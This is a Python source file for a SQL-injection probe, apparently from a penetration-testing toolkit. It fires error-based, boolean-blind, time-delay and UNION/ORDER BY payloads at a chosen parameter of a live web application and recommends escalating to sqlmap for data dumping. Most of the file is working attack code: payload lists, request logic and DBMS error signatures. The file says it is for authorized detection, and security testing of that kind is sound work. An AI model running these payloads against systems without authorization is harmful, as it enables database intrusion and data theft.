#!/usr/bin/env python3
"""sqli_probe.py — owned SQL-injection DETECTION for pen_test.

Confirms a candidate injection point across four independent signals so a
finding never rests on one ambiguous response:

  1. error-based   — a syntax-breaking payload provokes a DBMS error string
  2. boolean-blind — a TRUE vs FALSE condition produces different responses
  3. time-blind    — a conditional sleep measurably delays the response
  4. UNION         — column count discovered via ORDER BY / UNION SELECT NULLs

Unlike the previous version this tests ANY injection location (query, form,
JSON body, header, cookie, URL path) through the shared _httpcore engine, with
a real authenticated session and optional proxy — not just GET query strings.

This is deliberately a DETECTOR, narrower than sqlmap's full extraction depth.
Once it confirms a point, escalate to the registered sqlmap for DBMS-specific
dumping (see SKILL.md). See knowledge/sql_injection.md for the methodology and
the per-signal validation bar.

AUTHORIZATION: active traffic — authorized targets only.

Usage:
    python3 sqli_probe.py -u "https://app/item?id=1" --param id
    python3 sqli_probe.py -u "https://app/login" -X POST --location form \\
        --param username --data "username=a&password=b"
    python3 sqli_probe.py -u "https://app/api/x" -X POST --location json \\
        --param filter --json '{"filter":"a"}' --time-based
"""

from __future__ import annotations

import argparse
import json as jsonlib
import re
import statistics
import time

import _httpcore as core

# DBMS error signatures — presence of any is strong error-based evidence.
DBMS_ERRORS = {
    "MySQL": [r"SQL syntax.*MySQL", r"check the manual that corresponds to your (MySQL|MariaDB)",
              r"MySqlException", r"valid MySQL result", r"Unknown column '[^ ]+' in 'field list'"],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PSQLException",
                   r"unterminated quoted string at or near", r"invalid input syntax for"],
    "Microsoft SQL Server": [r"Microsoft SQL Native Client", r"ODBC SQL Server Driver",
                             r"Unclosed quotation mark after the character string",
                             r"System\.Data\.SqlClient\.SqlException", r"Incorrect syntax near"],
    "Oracle": [r"ORA-\d{5}", r"Oracle error", r"quoted string not properly terminated",
               r"SQL command not properly ended"],
    "SQLite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"sqlite3.OperationalError",
               r"unrecognized token:", r"SQL logic error"],
}
_COMPILED_ERRORS = {db: [re.compile(p, re.I) for p in pats] for db, pats in DBMS_ERRORS.items()}

ERROR_PAYLOADS = ["'", "\"", "')", "';", "\\", "' AND '1'='1' -- -"]
TRUE_SUFFIXES = ["' OR '1'='1", "\" OR \"1\"=\"1", " OR 1=1-- -", "') OR ('1'='1"]
FALSE_SUFFIXES = ["' OR '1'='2", "\" OR \"1\"=\"2", " OR 1=2-- -", "') OR ('1'='2"]
TIME_TEMPLATES = [
    ("MySQL/MariaDB", "' AND SLEEP({s})-- -"),
    ("MySQL (paren)", "') AND SLEEP({s})-- -"),
    ("PostgreSQL", "'||(SELECT CASE WHEN(1=1) THEN pg_sleep({s}) ELSE pg_sleep(0) END)||'"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{s}'-- -"),
    ("generic numeric", " AND SLEEP({s})"),
]


def detect_dbms_errors(text: str) -> list[str]:
    return [db for db, pats in _COMPILED_ERRORS.items() if any(p.search(text) for p in pats)]


def _spec(args: argparse.Namespace) -> core.RequestSpec:
    base_json = jsonlib.loads(args.json) if args.json else None
    base_form = dict(core.parse_kv(args.data.split("&"), "=")) if args.data else {}
    return core.RequestSpec(
        method=args.method, url=args.url, param=args.param, location=args.location,
        base_form=base_form, base_json=base_json,
    )


def error_based(client: core.Client, spec: core.RequestSpec) -> bool:
    print("\n[error-based] injecting syntax-breaking payloads...")
    hit = False
    for p in ERROR_PAYLOADS:
        r = client.request(**spec.build(p, prefix_base=True))
        dbs = detect_dbms_errors(r.text) if r.ok else []
        tag = f"DBMS ERROR -> {', '.join(dbs)}" if dbs else "no error signature"
        print(f"  {p!r:24s} status={r.status:>3} len={r.length:>7}  {tag}")
        if dbs:
            hit = True
    if hit:
        print("  [!] error-based CANDIDATE — a DBMS parser error surfaced in the response.")
    return hit


def boolean_blind(client: core.Client, spec: core.RequestSpec) -> bool:
    print("\n[boolean-blind] comparing TRUE vs FALSE conditions...")
    found = False
    for st, sf in zip(TRUE_SUFFIXES, FALSE_SUFFIXES):
        rt = client.request(**spec.build(st, prefix_base=True))
        rf = client.request(**spec.build(sf, prefix_base=True))
        differs = rt.signature() != rf.signature()
        print(f"  TRUE {st!r:22s} ({rt.status},{rt.length})  "
              f"FALSE {sf!r:22s} ({rf.status},{rf.length})  {'DIFFERS' if differs else 'same'}")
        if differs:
            found = True
    if found:
        print("  [!] boolean-blind CANDIDATE — confirm it tracks SQL logic, not a parser quirk\n"
              "      (e.g. re-run with a genuinely-true vs genuinely-false arithmetic condition).")
    return found


def time_blind(client: core.Client, spec: core.RequestSpec, delay: int) -> bool:
    print(f"\n[time-blind] baseline latency then conditional SLEEP({delay})...")
    samples = []
    for _ in range(5):
        r = client.request(**spec.build("", prefix_base=True))
        samples.append(r.elapsed)
    mean = statistics.mean(samples)
    stdev = statistics.pstdev(samples) or 0.05
    threshold = mean + max(3 * stdev, delay * 0.7)
    print(f"  baseline mean={mean:.2f}s stdev={stdev:.2f}s  -> threshold={threshold:.2f}s")
    found = False
    for label, tpl in TIME_TEMPLATES:
        payload = tpl.format(s=delay)
        r = client.request(**spec.build(payload, prefix_base=True))
        elapsed = (delay + client.timeout) if (not r.ok and r.error == "timeout") else r.elapsed
        hit = elapsed >= threshold
        print(f"  {label:16s} elapsed={elapsed:5.2f}s  {'DELAY HIT' if hit else 'no delay'}")
        if hit:
            found = True
    if found:
        print(f"  [!] time-blind CANDIDATE — re-run with --delay {delay*2} and confirm the delay\n"
              "      scales with the value before reporting (rules out one-off network jitter).")
    return found


def union_probe(client: core.Client, spec: core.RequestSpec, max_cols: int) -> int | None:
    print("\n[union] discovering column count via ORDER BY...")
    # Reference signature = ORDER BY 1, NOT the un-injected baseline. The
    # `ORDER BY n-- -` payload comments out the rest of the original query, so
    # even a VALID column count renders differently from the un-injected page;
    # comparing against the empty-payload baseline falsely "breaks" at n=2.
    # ORDER BY 1 is valid for any table with >=1 column, so it is the true
    # "still-ok" reference to diff subsequent n against.
    ref = client.request(**spec.build(" ORDER BY 1-- -", prefix_base=True))
    if detect_dbms_errors(ref.text):
        print("  ORDER BY 1 itself errors — not a clean UNION point (or not injectable here).")
        return None
    ref_sig = ref.signature()
    print(f"  ORDER BY 1  status={ref.status:>3} len={ref.length:>7}  (reference)")
    breakpoint_col = None
    for n in range(2, max_cols + 1):
        r = client.request(**spec.build(f" ORDER BY {n}-- -", prefix_base=True))
        # A DBMS error is the strong signal; a signature change vs ORDER BY 1
        # is the secondary one (re-confirm dynamic-content points manually).
        broke = detect_dbms_errors(r.text) or r.signature() != ref_sig
        print(f"  ORDER BY {n:<2} status={r.status:>3} len={r.length:>7}  {'BREAKS' if broke else 'ok'}")
        if broke:
            breakpoint_col = n - 1
            break
    if breakpoint_col and breakpoint_col >= 1:
        print(f"  [!] UNION CANDIDATE — likely {breakpoint_col} column(s). "
              f"Next: UNION SELECT {','.join(['NULL']*breakpoint_col)}-- -")
        return breakpoint_col
    print("  no clean ORDER BY breakpoint observed.")
    return None


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--param", required=True, help="field/segment name to inject")
    p.add_argument("--location", default="query", choices=core.LOCATIONS)
    p.add_argument("-X", "--method", default="GET")
    p.add_argument("--data", help="baseline form body, k=v&k=v (for --location form)")
    p.add_argument("--json", help="baseline JSON body (for --location json)")
    p.add_argument("--all", action="store_true", help="run every signal (default)")
    p.add_argument("--error-based", action="store_true")
    p.add_argument("--boolean", action="store_true")
    p.add_argument("--time-based", action="store_true")
    p.add_argument("--union", action="store_true")
    p.add_argument("--delay", type=int, default=5)
    p.add_argument("--max-cols", type=int, default=12)
    core.add_common_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)

    client = core.client_from_args(args)
    spec = _spec(args)
    run_all = args.all or not any([args.error_based, args.boolean, args.time_based, args.union])

    print(f"Target: {args.method} {args.url}  |  injecting `{args.param}` in {args.location}")
    hits = {}
    if run_all or args.error_based:
        hits["error-based"] = error_based(client, spec)
    if run_all or args.boolean:
        hits["boolean-blind"] = boolean_blind(client, spec)
    if run_all or args.time_based:
        hits["time-blind"] = time_blind(client, spec, args.delay)
    if run_all or args.union:
        hits["union"] = bool(union_probe(client, spec, args.max_cols))

    confirmed = [k for k, v in hits.items() if v]
    print("\n" + "=" * 60)
    if confirmed:
        print(f"[!] SQLi candidate via: {', '.join(confirmed)}")
        print("    Escalate to sqlmap for extraction ONLY after independent confirmation:")
        print(f"    python3 engines/sqlmap/sqlmap.py -u '{args.url}' --batch --level=2 --risk=1")
    else:
        print("[-] No SQLi signal on this point/param with the current payload set.")
        print("    Absence here is not proof of safety — try other params/locations and sqlmap --level.")


if __name__ == "__main__":
    main()
